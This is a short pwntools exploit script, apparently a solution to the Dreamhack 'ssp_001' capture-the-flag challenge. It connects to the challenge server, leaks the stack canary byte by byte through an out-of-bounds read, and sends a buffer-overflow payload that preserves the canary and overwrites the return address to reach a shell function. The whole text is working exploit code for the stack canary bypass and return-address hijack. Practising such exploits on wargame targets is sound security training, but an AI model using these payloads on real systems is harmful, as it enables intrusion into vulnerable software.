from pwn import *

p = remote('host3.dreamhack.games', 22041)
#p = process('./ssp_001')
#gdb.attach(p)

def get_partial_canary(idx):
    a = p.recvuntil(b'> ')
    p.sendline(b'P')
    p.sendlineafter(b'Element index : ', str(idx).encode())
    b = p.recvuntil(b': ')
    p_c = p.recv(2)
    return p_c

cnry1 = get_partial_canary(128) #00
cnry2 = get_partial_canary(129) #aa 
cnry3 = get_partial_canary(130) #bb
cnry4 = get_partial_canary(131) #cc

cnry = cnry4 + cnry3 + cnry2 + cnry1 #### whY?????????????????
print(cnry)
shell_addr = 0x80486b9

payload = b'A' * 0x40
payload += p32(int(cnry,16)) #canary
payload += b'A'*0x4 #sfp
payload += b"B" *4 #dummy
payload += p32(shell_addr)#ret
#p32(shell_addr)


payload_len = len(payload)
print(payload)
p.recvuntil(b'> ')
p.sendline(b'E')

#raw_input()
p.sendlineafter(b'Name Size : ', str(payload_len).encode())
print(str(payload_len).encode())
p.sendlineafter(b'Name : ', payload)

p.interactive()
